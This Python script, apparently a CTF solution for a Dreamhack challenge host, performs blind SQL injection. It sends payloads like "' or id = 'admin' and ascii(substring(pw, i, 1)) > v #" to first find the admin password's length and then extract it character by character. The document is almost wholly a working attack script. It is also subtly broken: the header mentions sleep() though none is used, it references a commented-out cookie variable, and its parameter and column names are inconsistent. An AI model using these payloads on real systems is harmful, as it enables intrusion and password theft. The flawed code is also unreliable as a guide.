# blind-sqli, sleep()을 이용

import requests

url = "http://host3.dreamhack.games:20689/"
# cookie = {"PHPSESSID": "cookie"}


def find_length():
    pwlength = 1

    while True:
        param = {"uid": "' or id = 'admin' and length(upw) = {} #".format(pwlength)}
        # req = requests.get(url, params=param, cookies=cookie)
        req = requests.get(url, params=param)
        if "Hello admin" in req.text:
            return pwlength
        else:
            pwlength += 1


def find_pw():
    length = find_length()
    password = ""
    for i in range(length):
        s = 1
        e = 127
        value = 64
        while True:
            param = {
                "pw": "' or id = 'admin' and ascii(substring(pw, {}, 1)) = {} #".format(
                    i + 1, value
                )
            }
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "Hello admin" in req.text:
                password += chr(value)
                break
            else:
                param = {
                    "pw": "' or id = 'admin' and ascii(substring(pw, {}, 1)) > {} #".format(
                        i + 1, value
                    )
                }
                req = requests.get(url, params=param, cookies=cookie)
                if "Hello admin" in req.text:
                    s = value
                    value = (value + e) // 2
                else:
                    e = value
                    value = (s + value) // 2
    print("비밀번호는: ", password)


find_pw()
